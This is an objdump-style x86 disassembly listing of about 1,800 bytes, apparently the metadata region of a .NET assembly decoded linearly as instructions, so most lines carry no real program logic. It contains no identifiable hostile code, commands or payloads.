  403f3f:	add    BYTE PTR [eax+0x7e],dh
  403f42:	xor    eax,DWORD PTR [eax]
  403f44:	add    BYTE PTR [edi+ebp*2],al
  403f47:	int    0x0
  403f49:	add    BYTE PTR [edx],cl
  403f4b:	sub    dl,BYTE PTR [esi+0x28]
  403f4e:	push   esp
  403f4f:	add    BYTE PTR [eax],al
  403f51:	push   es
  403f52:	jb     0x403f4a
  403f54:	push   cs
  403f55:	add    BYTE PTR [eax+0x7e],dh
  403f58:	xor    eax,DWORD PTR [eax]
  403f5a:	add    BYTE PTR [edi+ebp*2],al
  403f5d:	int    0x0
  403f5f:	add    BYTE PTR [edx],cl
  403f61:	sub    dl,BYTE PTR [esi+0x28]
  403f64:	push   esp
  403f65:	add    BYTE PTR [eax],al
  403f67:	push   es
  403f68:	jb     0x403f90
  403f6a:	(bad)  
  403f6c:	jo     0x403fec
  403f6e:	xor    eax,DWORD PTR [eax]
  403f70:	add    BYTE PTR [edi+ebp*2],al
  403f73:	int    0x0
  403f75:	add    BYTE PTR [edx],cl
  403f77:	sub    dl,BYTE PTR [esi+0x28]
  403f7a:	push   esp
  403f7b:	add    BYTE PTR [eax],al
  403f7d:	push   es
  403f7e:	jb     0x403fd6
  403f80:	(bad)  
  403f82:	jo     0x404002
  403f84:	xor    eax,DWORD PTR [eax]
  403f86:	add    BYTE PTR [edi+ebp*2],al
  403f89:	int    0x0
  403f8b:	add    BYTE PTR [edx],cl
  403f8d:	sub    dl,BYTE PTR [esi+0x28]
  403f90:	push   esp
  403f91:	add    BYTE PTR [eax],al
  403f93:	push   es
  403f94:	jb     0x403f16
  403f96:	(bad)  
  403f98:	jo     0x404018
  403f9a:	xor    eax,DWORD PTR [eax]
  403f9c:	add    BYTE PTR [edi+ebp*2],al
  403f9f:	int    0x0
  403fa1:	add    BYTE PTR [edx],cl
  403fa3:	sub    dl,BYTE PTR [esi+0x28]
  403fa6:	push   esp
  403fa7:	add    BYTE PTR [eax],al
  403fa9:	push   es
  403faa:	jb     0x403f5a
  403fac:	(bad)  
  403fae:	jo     0x40402e
  403fb0:	xor    eax,DWORD PTR [eax]
  403fb2:	add    BYTE PTR [edi+ebp*2],al
  403fb5:	int    0x0
  403fb7:	add    BYTE PTR [edx],cl
  403fb9:	sub    dl,BYTE PTR [esi+0x28]
  403fbc:	push   esp
  403fbd:	add    BYTE PTR [eax],al
  403fbf:	push   es
  403fc0:	jb     0x403fa4
  403fc2:	(bad)  
  403fc4:	jo     0x404044
  403fc6:	xor    eax,DWORD PTR [eax]
  403fc8:	add    BYTE PTR [edi+ebp*2],al
  403fcb:	int    0x0
  403fcd:	add    BYTE PTR [edx],cl
  403fcf:	sub    dl,BYTE PTR [esi+0x28]
  403fd2:	push   esp
  403fd3:	add    BYTE PTR [eax],al
  403fd5:	push   es
  403fd6:	jb     0x403fee
  403fd8:	adc    BYTE PTR [eax],al
  403fda:	jo     0x40405a
  403fdc:	xor    eax,DWORD PTR [eax]
  403fde:	add    BYTE PTR [edi+ebp*2],al
  403fe1:	int    0x0
  403fe3:	add    BYTE PTR [edx],cl
  403fe5:	sub    dl,BYTE PTR [esi+0x28]
  403fe8:	push   esp
  403fe9:	add    BYTE PTR [eax],al
  403feb:	push   es
  403fec:	jb     0x404052
  403fee:	adc    BYTE PTR [eax],al
  403ff0:	jo     0x404070
  403ff2:	xor    eax,DWORD PTR [eax]
  403ff4:	add    BYTE PTR [edi+ebp*2],al
  403ff7:	int    0x0
  403ff9:	add    BYTE PTR [edx],cl
  403ffb:	sub    dl,BYTE PTR [esi+0x28]
  403ffe:	push   esp
  403fff:	add    BYTE PTR [eax],al
  404001:	push   es
  404002:	jb     0x403f9a
  404004:	adc    BYTE PTR [eax],al
  404006:	jo     0x404086
  404008:	xor    eax,DWORD PTR [eax]
  40400a:	add    BYTE PTR [edi+ebp*2],al
  40400d:	int    0x0
  40400f:	add    BYTE PTR [edx],cl
  404011:	sub    dl,BYTE PTR [esi+0x28]
  404014:	push   esp
  404015:	add    BYTE PTR [eax],al
  404017:	push   es
  404018:	jb     0x403fe0
  40401a:	adc    BYTE PTR [eax],al
  40401c:	jo     0x40409c
  40401e:	xor    eax,DWORD PTR [eax]
  404020:	add    BYTE PTR [edi+ebp*2],al
  404023:	int    0x0
  404025:	add    BYTE PTR [edx],cl
  404027:	sub    dl,BYTE PTR [esi+0x28]
  40402a:	push   esp
  40402b:	add    BYTE PTR [eax],al
  40402d:	push   es
  40402e:	jb     0x40402e
  404030:	adc    BYTE PTR [eax],al
  404032:	jo     0x4040b2
  404034:	xor    eax,DWORD PTR [eax]
  404036:	add    BYTE PTR [edi+ebp*2],al
  404039:	int    0x0
  40403b:	add    BYTE PTR [edx],cl
  40403d:	sub    dl,BYTE PTR [esi+0x28]
  404040:	push   esp
  404041:	add    BYTE PTR [eax],al
  404043:	push   es
  404044:	jb     0x40407a
  404046:	adc    DWORD PTR [eax],eax
  404048:	jo     0x4040c8
  40404a:	xor    eax,DWORD PTR [eax]
  40404c:	add    BYTE PTR [edi+ebp*2],al
  40404f:	int    0x0
  404051:	add    BYTE PTR [edx],cl
  404053:	sub    dl,BYTE PTR [esi+0x28]
  404056:	push   esp
  404057:	add    BYTE PTR [eax],al
  404059:	push   es
  40405a:	jb     0x4040bc
  40405c:	adc    DWORD PTR [eax],eax
  40405e:	jo     0x4040de
  404060:	xor    eax,DWORD PTR [eax]
  404062:	add    BYTE PTR [edi+ebp*2],al
  404065:	int    0x0
  404067:	add    BYTE PTR [edx],cl
  404069:	sub    dl,BYTE PTR [esi+0x28]
  40406c:	push   esp
  40406d:	add    BYTE PTR [eax],al
  40406f:	push   es
  404070:	jb     0x40400e
  404072:	adc    DWORD PTR [eax],eax
  404074:	jo     0x4040f4
  404076:	xor    eax,DWORD PTR [eax]
  404078:	add    BYTE PTR [edi+ebp*2],al
  40407b:	int    0x0
  40407d:	add    BYTE PTR [edx],cl
  40407f:	sub    al,BYTE PTR [edx+0x53]
  404082:	dec    edx
  404083:	inc    edx
  404084:	add    DWORD PTR [eax],eax
  404086:	add    DWORD PTR [eax],eax
  404088:	add    BYTE PTR [eax],al
  40408a:	add    BYTE PTR [eax],al
  40408c:	or     al,0x0
  40408e:	add    BYTE PTR [eax],al
  404090:	jbe    0x4040c6
  404092:	xor    BYTE PTR cs:[esi],ch
  404095:	xor    esi,DWORD PTR [eax]
  404097:	xor    esi,DWORD PTR [ecx]
  404099:	cmp    DWORD PTR [eax],eax
  40409b:	add    BYTE PTR [eax],al
  40409d:	add    BYTE PTR ds:0x6c00,al
  4040a3:	add    BYTE PTR [esp+ebx*1+0x0],bl
  4040a7:	add    BYTE PTR [ebx],ah
  4040a9:	jle    0x4040ab
  4040ab:	add    al,cl
  4040ad:	sbb    al,0x0
  4040af:	add    BYTE PTR [eax],dl
  4040b1:	sub    al,0x0
  4040b3:	add    BYTE PTR [ebx],ah
  4040b5:	push   ebx
  4040b6:	je     0x40412a
  4040b8:	imul   ebp,DWORD PTR [esi+0x67],0x73
  4040bf:	add    al,bl
  4040c1:	dec    eax
  4040c2:	add    BYTE PTR [eax],al
  4040c4:	in     al,0x11
  4040c6:	add    BYTE PTR [eax],al
  4040c8:	and    edx,DWORD PTR [ebp+0x53]
  4040cb:	add    BYTE PTR [edx+ebx*2+0x100000],bh
  4040d2:	add    BYTE PTR [eax],al
  4040d4:	and    eax,DWORD PTR [edi+0x55]
  4040d7:	dec    ecx
  4040d8:	inc    esp
  4040d9:	add    BYTE PTR [eax],al
  4040db:	add    ah,cl
  4040dd:	pop    edx
  4040de:	add    BYTE PTR [eax],al
  4040e0:	lods   al,BYTE PTR ds:[esi]
  4040e1:	or     al,0x0
  4040e3:	add    BYTE PTR [ebx],ah
  4040e5:	inc    edx
  4040e6:	ins    BYTE PTR es:[edi],dx
  4040e7:	outs   dx,DWORD PTR ds:[esi]
  4040e8:	bound  eax,QWORD PTR [eax]
  4040ea:	add    BYTE PTR [eax],al
  4040ec:	add    BYTE PTR [eax],al
  4040ee:	add    BYTE PTR [eax],al
  4040f0:	add    al,BYTE PTR [eax]
  4040f2:	add    BYTE PTR [ecx],al
  4040f4:	push   edi
  4040f5:	pop    ds
  4040f6:	mov    ds:0xa0909,al
  4040fb:	add    BYTE PTR [eax],al
  4040fd:	cli    
  4040fe:	and    eax,0x160033
  404103:	add    BYTE PTR [ecx],al
  404105:	add    BYTE PTR [eax],al
  404107:	add    BYTE PTR [ebp+0x0],dh
  40410a:	add    BYTE PTR [eax],al
  40410c:	adc    DWORD PTR [eax],eax
  40410e:	add    BYTE PTR [eax],al
  404110:	aaa    
  404111:	add    BYTE PTR [eax],al
  404113:	add    BYTE PTR [esi+0x37000000],bl
  404119:	add    BYTE PTR [eax],al
  40411b:	add    BYTE PTR [esi],al
  40411d:	add    BYTE PTR [eax],al
  40411f:	add    dh,cl
  404121:	add    BYTE PTR [eax],al
  404123:	add    BYTE PTR [edi],dl
  404125:	add    BYTE PTR [eax],al
  404127:	add    BYTE PTR [ecx+0x0],dl
  40412a:	add    BYTE PTR [eax],al
  40412c:	sbb    al,BYTE PTR [eax]
  40412e:	add    BYTE PTR [eax],al
  404130:	add    al,0x0
  404132:	add    BYTE PTR [eax],al
  404134:	pop    eax
  404135:	add    BYTE PTR [eax],al
  404137:	add    BYTE PTR [ecx+0x0],ch
  40413a:	add    BYTE PTR [eax],al
  40413c:	adc    DWORD PTR [eax],eax
  40413e:	add    BYTE PTR [eax],al
  404140:	add    DWORD PTR [eax],eax
  404142:	add    BYTE PTR [eax],al
  404144:	add    eax,0x3000000
  404149:	add    BYTE PTR [eax],al
  40414b:	add    BYTE PTR [esi],cl
  40414d:	add    BYTE PTR [eax],al
  40414f:	add    BYTE PTR [eax],al
  404151:	add    BYTE PTR [edx],cl
  404153:	add    BYTE PTR [ecx],al
  404155:	add    BYTE PTR [eax],al
  404157:	add    BYTE PTR [eax],al
  404159:	add    BYTE PTR [esi],al
  40415b:	add    BYTE PTR [eax+0x1],dl
  40415e:	dec    ecx
  40415f:	add    DWORD PTR [esi],eax
  404161:	add    BYTE PTR [edi+0x1],dl
  404164:	dec    ecx
  404165:	add    DWORD PTR [edx],ecx
  404167:	add    BYTE PTR [edx+0x6018301],ch
  40416d:	add    ch,al
  40416f:	add    DWORD PTR [ecx+0x1],ecx
  404172:	or     al,BYTE PTR [eax]
  404174:	retf   0x8301
  404177:	add    DWORD PTR [esi],eax
  404179:	add    BYTE PTR [edx],ah
  40417b:	add    al,BYTE PTR [edi]
  40417d:	add    cl,BYTE PTR [edx]
  40417f:	add    BYTE PTR [ecx+0x2],dh
  404182:	add    DWORD PTR [ecx],0xa
  404185:	add    BYTE PTR [edx+eax*1+0x60183],dl
  40418c:	mov    DWORD PTR [edx],0xa0207
  404192:	fiadd  WORD PTR [edx]
  404194:	add    DWORD PTR [ecx],0x6
  404197:	add    BYTE PTR [esi],cl
  404199:	add    eax,DWORD PTR [edi]
  40419b:	add    cl,BYTE PTR [edx]
  40419d:	add    BYTE PTR [ecx],dl
  40419f:	add    al,0x83
  4041a1:	add    DWORD PTR [edx],ecx
  4041a3:	add    bh,al
  4041a5:	add    eax,0x60183
  4041aa:	pop    ebp
  4041ab:	or     ecx,DWORD PTR [ecx+0x1]
  4041ae:	push   cs
  4041af:	add    BYTE PTR [ebx+0xa0b880b],bl
  4041b5:	add    BYTE PTR [esi+0xa01830b],dh
  4041bb:	add    BYTE PTR [esi],dh
  4041bd:	or     al,0x83
  4041bf:	add    DWORD PTR [edx],ecx
  4041c1:	add    BYTE PTR [edx+0xc],bl
  4041c4:	add    DWORD PTR [ecx],0x6
  4041c7:	add    BYTE PTR [ebx+0x60ca20c],dh
  4041cd:	add    ah,ah
  4041cf:	or     al,0xcf
  4041d1:	or     al,0x6
  4041d3:	add    BYTE PTR ds:0x619ee1a,cl
  4041d9:	add    BYTE PTR [edx+ebx*1+0x5a],dh
  4041dd:	sbb    al,BYTE PTR [esi]
  4041df:	add    BYTE PTR [ebp+0x619ee1a],cl
  4041e5:	add    BYTE PTR [ecx+0x601491a],ah
  4041eb:	add    cl,cl
  4041ed:	sbb    dh,BYTE PTR [edi-0x1ffff9e6]
  4041f3:	sbb    dh,BYTE PTR [edi-0x2fff9e6]
  4041f9:	sbb    dh,BYTE PTR [edi+0x1b00061a]
  4041ff:	sbb    esi,DWORD PTR [edi+0x3400061a]
  404205:	sbb    esi,DWORD PTR [edi+0x4d00061a]
  40420b:	sbb    esi,DWORD PTR [edi+0x6800061a]
  404211:	sbb    esi,DWORD PTR [edi-0x7efff9e6]
  404217:	sbb    esi,DWORD PTR [edi-0x61fff9e6]
  40421d:	sbb    esi,DWORD PTR [edi-0x3bfff9e6]
  404223:	sbb    esp,DWORD PTR [edx-0x19fff9f4]
  404229:	sbb    esp,DWORD PTR [edx+0x800060c]
  40422f:	sbb    al,0xa2
  404231:	or     al,0x6
  404233:	add    BYTE PTR [ecx],ch
  404235:	sbb    al,0xb7
  404237:	sbb    al,BYTE PTR [esi]
  404239:	add    BYTE PTR [esp+ebx*1-0x49],al
  40423d:	sbb    al,BYTE PTR [esi]
  40423f:	add    BYTE PTR [ebp+0x1c],bl
  404242:	mov    bh,0x1a
  404244:	push   es
  404245:	add    BYTE PTR [ebx+0x61c7b1c],bl
  40424b:	add    BYTE PTR [ecx-0x58f477e4],bh
  404251:	add    ch,cl
  404253:	sbb    al,0x0
  404255:	add    BYTE PTR [esi],al
  404257:	add    ah,bl
  404259:	sbb    al,0x7b
  40425b:	sbb    al,0x6
  40425d:	add    BYTE PTR [ebx*1+0xa0149],cl
  404264:	push   ds
  404265:	sbb    eax,0xa0183
  40426a:	xor    al,0x1d
  40426c:	add    DWORD PTR [ecx],0x6
  40426f:	add    BYTE PTR [edx+0x1d],ch
  404272:	dec    ecx
  404273:	add    DWORD PTR [edx],ecx
  404275:	add    BYTE PTR [eax+0x1d],bh
  404278:	add    DWORD PTR [ecx],0x6
  40427b:	add    BYTE PTR [eax+0xa01491d],al
  404281:	add    BYTE PTR [ebp+ebx*1+0xa0183],ah
  404288:	mov    bl,0x1d
  40428a:	add    DWORD PTR [ecx],0xa
  40428d:	add    ah,bl
  40428f:	sbb    eax,0x60183
  404294:	jge    0x4042b4
  404296:	dec    ecx
  404297:	add    DWORD PTR [esi],eax
  404299:	add    BYTE PTR [edx+0x61ab71e],ah
  40429f:	add    al,dl
  4042a1:	push   ds
  4042a2:	mov    bh,0x1a
  4042a4:	push   es
  4042a5:	add    bh,bh
  4042a7:	push   ds
  4042a8:	cmc    
  4042a9:	push   ds
  4042aa:	push   es
  4042ab:	add    BYTE PTR [edi+ebx*1+0x60],ch
  4042af:	pop    ds
  4042b0:	adc    al,BYTE PTR [eax]
  4042b2:	lahf   
  4042b3:	pop    ds
  4042b4:	xchg   ebx,eax
  4042b5:	pop    ds
  4042b6:	push   cs
  4042b7:	add    ah,ah
  4042b9:	pop    ds
  4042ba:	mov    BYTE PTR [ebx],cl
  4042bc:	push   es
  4042bd:	add    BYTE PTR [esi],dl
  4042bf:	and    BYTE PTR [ecx+0x1],cl
  4042c2:	or     al,BYTE PTR [eax]
  4042c4:	aas    
  4042c5:	and    BYTE PTR [ebx+0x64000a01],al
  4042cb:	and    BYTE PTR [ebx-0x3ffff9ff],al
  4042d1:	and    BYTE PTR [ecx+0x1],cl
  4042d4:	or     al,BYTE PTR [eax]
  4042d6:	(bad)  
  4042d7:	and    BYTE PTR [ebx-0xdfff5ff],al
  4042dd:	and    BYTE PTR [ebx+0x27001601],al
  4042e3:	and    DWORD PTR [ebx],edx
  4042e5:	and    DWORD PTR [edx],ecx
  4042e7:	add    BYTE PTR [eax],bh
  4042e9:	and    DWORD PTR [ebx+0x7a000601],eax
  4042ef:	and    ebp,esi
  4042f1:	push   ds
  4042f2:	or     al,BYTE PTR [eax]
  4042f4:	xchg   BYTE PTR [ecx],ah
  4042f6:	add    DWORD PTR [ecx],0x6
  4042f9:	add    BYTE PTR [esi+0xa1ef521],bh
  4042ff:	add    BYTE PTR [eax],dl
  404301:	and    al,BYTE PTR [ebx+0x30000a01]
  404307:	and    al,BYTE PTR [ebx+0x21001201]
  40430d:	and    eax,DWORD PTR [edi]
  40430f:	add    al,BYTE PTR [esi]
  404311:	add    BYTE PTR [eax+0x23],cl
  404314:	dec    ecx
  404315:	add    DWORD PTR [esi],eax
  404317:	add    BYTE PTR [edi+0x6014923],bl
  40431d:	add    ch,bl
  40431f:	and    ecx,DWORD PTR [ecx+0x1]
  404322:	or     al,BYTE PTR [eax]
  404324:	in     al,dx
  404325:	and    eax,DWORD PTR [ebx+0xc000a01]
  40432b:	and    al,0x83
  40432d:	add    DWORD PTR [edx],ecx
  40432f:	add    BYTE PTR [ecx+0x24],cl
  404332:	pop    ds
  404333:	and    al,0x6
  404335:	add    BYTE PTR [edi+0x24],dl
  404338:	pop    es
  404339:	add    cl,BYTE PTR [edx]
  40433b:	add    BYTE PTR [edi+0x24],bl
  40433e:	add    DWORD PTR [ecx],0xa
  404341:	add    BYTE PTR [esi+0x24],dh
  404344:	add    DWORD PTR [ecx],0x6
  404347:	add    BYTE PTR [ecx+0xa248824],bl
  40434d:	add    BYTE PTR [esp+0x6241f],bh
  404354:	dec    edi
  404355:	and    eax,0xa1c7b
  40435a:	test   eax,0xa241f25
  40435f:	add    dl,al
  404361:	and    eax,0x27241f
  404366:	fldenv ds:0x60000
  40436c:	push   ss
  40436d:	es dec ecx
  40436f:	add    DWORD PTR [esi],eax
  404371:	add    BYTE PTR [ecx+0x26],al
  404374:	sub    ah,BYTE PTR [esi]
  404376:	or     al,BYTE PTR [eax]
  404378:	dec    eax
  404379:	add    DWORD PTR es:[ecx],0xa
  40437d:	add    BYTE PTR [esi+eiz*1-0x7d],dl
  404381:	add    DWORD PTR [esi],eax
  404383:	add    BYTE PTR [esi+0x26],dh
  404386:	sub    ah,BYTE PTR [esi]
  404388:	or     al,BYTE PTR [eax]
  40438a:	and    BYTE PTR [esi],0x1f
  40438d:	and    al,0x12
  40438f:	add    BYTE PTR [ebx+0x61f9326],dh
  404395:	add    BYTE PTR [esi],ch
  404397:	daa    
  404398:	pop    es
  404399:	add    al,BYTE PTR [esi]
  40439b:	add    BYTE PTR [edi+0x27],cl
  40439e:	cmp    al,0x27
  4043a0:	push   es
  4043a1:	add    BYTE PTR [esi],bl
  4043a3:	sub    BYTE PTR [ecx+0x1],cl
  4043a6:	push   es
  4043a7:	add    BYTE PTR ds:0x6014928,dh
  4043ad:	add    BYTE PTR [eax+0x28],dl
  4043b0:	cmc    
  4043b1:	push   ds
  4043b2:	push   es
  4043b3:	add    BYTE PTR [edx+0x28],bl
  4043b6:	cmc    
  4043b7:	push   ds
  4043b8:	or     al,BYTE PTR [eax]
  4043ba:	test   DWORD PTR [eax],ebp
  4043bc:	add    DWORD PTR [ecx],0x6
  4043bf:	add    BYTE PTR [eax+ebp*1+0xa0149],dh
  4043c6:	aad    0x28
  4043c8:	add    DWORD PTR [ecx],0x6
  4043cb:	add    BYTE PTR [eax],bh
  4043cd:	sub    DWORD PTR [ecx+0x1],ecx
  4043d0:	or     al,BYTE PTR [eax]
  4043d2:	mov    WORD PTR [ecx],gs
  4043d4:	add    DWORD PTR [ecx],0x16
  4043d7:	add    bl,bl
  4043d9:	sub    DWORD PTR [ebx],edx
  4043db:	and    DWORD PTR [esi],edx
  4043dd:	add    al,ch
  4043df:	sub    DWORD PTR [ebx],edx
  4043e1:	and    DWORD PTR [edx],ecx
  4043e3:	add    BYTE PTR [eax],ch
  4043e5:	sub    al,BYTE PTR [ebx+0x4e000a01]
  4043eb:	sub    al,BYTE PTR [ebx-0x6ffff5ff]
  4043f1:	sub    al,BYTE PTR [ebx+0x2000a01]
  4043f7:	sub    eax,DWORD PTR [ebx+0x4a000e01]
  4043fd:	sub    esi,DWORD PTR [edx]
  4043ff:	sub    eax,DWORD PTR [esi]
  404401:	add    BYTE PTR [ecx+0x2b],ah
  404404:	mov    BYTE PTR [ebx],cl
  404406:	push   es
  404407:	add    BYTE PTR [esi+0xe01492b],cl
  40440d:	add    bh,bl
  40440f:	sub    ecx,ecx
  404411:	sub    ecx,DWORD PTR [esi]
  404413:	add    al,bh
  404415:	sub    ecx,ecx
  404417:	sub    eax,DWORD PTR [eax]
  404419:	add    BYTE PTR [eax],al
  40441b:	add    BYTE PTR [ecx],al
  40441d:	add    BYTE PTR [eax],al
  40441f:	add    BYTE PTR [eax],al
  404421:	add    BYTE PTR [ecx],al
  404423:	add    BYTE PTR [ecx],al
  404425:	add    BYTE PTR [ecx+0x1e001001],al
  40442b:	add    BYTE PTR [edi],ch
  40442d:	add    BYTE PTR ds:0x1000100,al
  404433:	add    BYTE PTR [ecx+0x5b000000],ah
  404439:	add    BYTE PTR [edi],ch
  40443b:	add    BYTE PTR [eax],al
  40443d:	add    BYTE PTR [ecx],al
  40443f:	add    BYTE PTR [esi],al
  404441:	add    BYTE PTR [ecx],al
  404443:	add    BYTE PTR [eax],dl
  404445:	add    BYTE PTR [esi+0x0],ch
  404448:	das    
  404449:	add    BYTE PTR ds:0x7000100,al
  40444f:	add    BYTE PTR [ecx],al
  404451:	add    BYTE PTR [eax],dl
  404453:	add    BYTE PTR [eax+eax*1+0x2f],bh
  404457:	add    BYTE PTR ds:0x9000100,al
  40445d:	add    BYTE PTR [ecx],al
  40445f:	add    BYTE PTR [eax],dl
  404461:	add    BYTE PTR [edx+0x5002f00],cl
  404467:	add    BYTE PTR [ecx],al
  404469:	add    BYTE PTR [ebx],cl
  40446b:	add    BYTE PTR [ecx],al
  40446d:	add    BYTE PTR [eax],dl
  40446f:	add    BYTE PTR [eax+0x5002f00],bl
  404475:	add    BYTE PTR [ecx],al
  404477:	add    BYTE PTR ds:0x10000100,cl
  40447d:	add    BYTE PTR [ebp+0x5002f00],ah
  404483:	add    BYTE PTR [ecx],al
  404485:	add    BYTE PTR [eax],dl
  404487:	add    BYTE PTR [ebx],al
  404489:	add    BYTE PTR [eax],dl
  40448b:	add    BYTE PTR [eax+eax*1+0x50000],dh
  404492:	add    al,0x0
  404494:	sbb    BYTE PTR [eax],al
  404496:	add    DWORD PTR [ecx],eax
  404498:	add    BYTE PTR [eax],al
  40449a:	les    eax,FWORD PTR [eax]
  40449c:	das    
  40449d:	add    BYTE PTR [ecx],dl
  40449f:	add    BYTE PTR [edi],al
  4044a1:	add    BYTE PTR [edx],bl
  4044a3:	add    BYTE PTR [ecx],al
  4044a5:	add    BYTE PTR [eax],dl
  4044a7:	add    al,bl
  4044a9:	add    BYTE PTR [edi],ch
  4044ab:	add    BYTE PTR ds:0x1a000d00,dl
  4044b1:	add    BYTE PTR [ecx],al
  4044b3:	add    DWORD PTR [eax],eax
  4044b5:	add    ah,ch
  4044b7:	add    BYTE PTR [edi],ch
  4044b9:	add    BYTE PTR [ecx],dl
  4044bb:	add    BYTE PTR ds:0x1004400,bl
  4044c1:	add    BYTE PTR [eax],dl
  4044c3:	add    BYTE PTR [eax],al
  4044c5:	add    DWORD PTR [edi],ebp
  4044c7:	add    BYTE PTR ds:0x44002f00,al
  4044cd:	add    BYTE PTR [ecx],al
  4044cf:	add    BYTE PTR [eax],dl
  4044d1:	add    BYTE PTR [edx],bl
  4044d3:	add    DWORD PTR [edi],ebp
  4044d5:	add    BYTE PTR ds:0x4a003100,al
  4044db:	add    BYTE PTR [eax],al
  4044dd:	add    BYTE PTR [eax],dl
  4044df:	add    BYTE PTR [ebx],dh
  4044e1:	add    DWORD PTR [edi],ebp
  4044e3:	add    BYTE PTR ds:0x53003200,al
  4044e9:	add    BYTE PTR [ebx],al
  4044eb:	add    DWORD PTR [eax],edx
  4044ed:	add    bl,dh
  4044ef:	and    DWORD PTR [eax],eax
  4044f1:	add    BYTE PTR ds:0x9a003400,al
  4044f7:	add    BYTE PTR [ebx],al
  4044f9:	add    DWORD PTR [eax],edx
  4044fb:	add    BYTE PTR [ecx+0x22],bl
  4044fe:	add    BYTE PTR [eax],al
  404500:	add    eax,0x9d003500
  404505:	add    BYTE PTR [ecx],dl
  404507:	add    BYTE PTR [eax],ch
  404509:	and    eax,0x110523
  40450e:	and    BYTE PTR ds:0x110535,0x7
  404515:	daa    
  404516:	and    eax,DWORD PTR ds:0x2f50001
  40451c:	pop    esp
  40451d:	add    BYTE PTR [ecx],al
  40451f:	add    bh,bh
  404521:	add    ah,BYTE PTR [eax+0x0]
  404524:	add    DWORD PTR [eax],eax
  404526:	sbb    eax,DWORD PTR [ebx]
  404528:	arpl   WORD PTR [eax],ax
  40452a:	push   es
  40452b:	push   es
  40452c:	cmp    al,BYTE PTR [ebx]
  40452e:	pusha  
  40452f:	add    BYTE PTR [esi-0x80],dl
  404532:	inc    edx
  404533:	add    esi,DWORD PTR [edx+0x0]
  404536:	push   esi
  404537:	add    BYTE PTR [edi+0x3],0x72
  40453b:	add    BYTE PTR [esi-0x80],dl
  40453e:	pop    esi
  40453f:	add    esi,DWORD PTR [edx+0x0]
  404542:	push   esi
  404543:	cmp    BYTE PTR [esi+0x3],0x72
  404547:	add    BYTE PTR [esi-0x80],dl
  40454a:	xchg   ebx,eax
  40454b:	add    esi,DWORD PTR [edx+0x0]
  40454e:	push   ecx
  40454f:	sub    BYTE PTR [eax+0x1008f03],0x0
  404556:	test   DWORD PTR [esi],0x10114
  40455c:	adc    BYTE PTR [edi],al
  40455e:	jb     0x404560
  404560:	add    DWORD PTR [eax],eax
  404562:	cmp    eax,DWORD PTR [edi]
  404564:	sbb    BYTE PTR [ecx],al
  404566:	add    DWORD PTR [eax],eax
  404568:	popa   
  404569:	pop    es
  40456a:	sbb    al,0x1
  40456c:	add    DWORD PTR [eax],eax
  40456e:	add    DWORD PTR [edi],0x1011c
  404574:	mov    ds:0x1011c07,al
  404579:	add    bl,al
  40457b:	pop    es
  40457c:	sbb    al,0x1
  40457e:	add    DWORD PTR [eax],eax
  404580:	in     al,0x7
  404582:	sbb    al,0x1
  404584:	add    DWORD PTR [eax],eax
  404586:	push   es
  404587:	or     BYTE PTR [edi],bl
  404589:	add    DWORD PTR [ecx],eax
  40458b:	add    BYTE PTR [ecx],ah
  40458d:	or     BYTE PTR [edi],bl
  40458f:	add    DWORD PTR [ecx],eax
  404591:	add    BYTE PTR ds:0x1012208,bh
  404597:	add    BYTE PTR [ecx+0x8],bl
  40459a:	pop    ds
  40459b:	add    DWORD PTR [ecx],eax
  40459d:	add    BYTE PTR [ebx+0x8],bh
  4045a0:	pop    ds
  4045a1:	add    DWORD PTR [ecx],eax
  4045a3:	add    BYTE PTR [eax+ecx*1+0x10126],bl
  4045aa:	mov    ah,0x8
  4045ac:	sbb    al,0x1
  4045ae:	push   es
  4045af:	push   es
  4045b0:	cmp    al,BYTE PTR [ebx]
  4045b2:	pusha  
  4045b3:	add    BYTE PTR [esi-0x80],dl
  4045b6:	ror    BYTE PTR [ecx],cl
  4045b8:	dec    edi
  4045b9:	add    DWORD PTR [esi-0x80],edx
  4045bc:	fimul  DWORD PTR [ecx]
  4045be:	dec    edi
  4045bf:	add    DWORD PTR [esi-0x80],edx
  4045c2:	clc    
  4045c3:	or     DWORD PTR [edi+0x1],ecx
  4045c6:	push   esi
  4045c7:	or     BYTE PTR [ebx],0xa
  4045ca:	dec    edi
  4045cb:	add    DWORD PTR [esi-0x80],edx
  4045ce:	daa    
  4045cf:	or     cl,BYTE PTR [edi+0x1]
  4045d2:	push   esi
  4045d3:	or     BYTE PTR [ebx+0xa],0x4f
  4045d7:	add    DWORD PTR [esi-0x80],edx
  4045da:	pop    eax
  4045db:	or     cl,BYTE PTR [edi+0x1]
  4045de:	push   esi
  4045df:	sub    BYTE PTR [ebx+0xa],0x4f
  4045e3:	add    DWORD PTR [esi-0x80],edx
  4045e6:	jnp    0x4045f2
  4045e8:	dec    edi
  4045e9:	add    DWORD PTR [esi-0x80],edx
  4045ec:	lea    ecx,[edx]
  4045ee:	dec    edi
  4045ef:	add    DWORD PTR [esi-0x80],edx
  4045f2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4045f3:	or     cl,BYTE PTR [edi+0x1]
  4045f6:	push   esi
  4045f7:	add    al,0xa
  4045fa:	dec    edi
  4045fb:	add    DWORD PTR [esi-0x80],edx
  4045fe:	(bad)  
  4045ff:	or     cl,BYTE PTR [edi+0x1]
  404602:	push   esi
  404603:	xor    cl,0xa
  404606:	dec    edi
  404607:	add    DWORD PTR [esi-0x80],edx
  40460a:	add    DWORD PTR [ebx],ecx
  40460c:	dec    edi
  40460d:	add    DWORD PTR [esi-0x80],edx
  404610:	daa    
  404611:	or     ecx,DWORD PTR [edi+0x1]
  404614:	push   esi
  404615:	add    BYTE PTR [ebx+0xb],0x4f
  404619:	add    DWORD PTR [ecx],eax
  40461b:	add    BYTE PTR [eax+0xb],ch
  40461e:	jno    0x404621
  404620:	add    DWORD PTR [eax],eax
  404622:	imul   ecx,DWORD PTR [ebx],0x1f
  404625:	add    DWORD PTR [ecx],eax
  404627:	add    BYTE PTR [ebx+0x1101ad0c],al
  40462d:	add    bl,al
  40462f:	or     al,0xb6
  404631:	add    DWORD PTR [ecx],edx
  404633:	add    al,dh
  404635:	or     al,0xba
  404637:	add    DWORD PTR [esi],eax
  404639:	add    BYTE PTR [esi],al
  40463b:	and    dl,dh
  40463d:	add    eax,DWORD PTR [esi]
  40463f:	add    BYTE PTR [edx+eiz*1-0x19],ch
  404643:	add    eax,DWORD PTR [esi]
  404645:	add    BYTE PTR [edx+eiz*1+0x22],bh
  404649:	add    DWORD PTR [esi],eax
  40464b:	add    BYTE PTR [edx+eiz*1+0x2150011c],al
  404652:	add    BYTE PTR [eax],al
  404654:	add    BYTE PTR [eax],al
  404656:	xchg   esi,eax
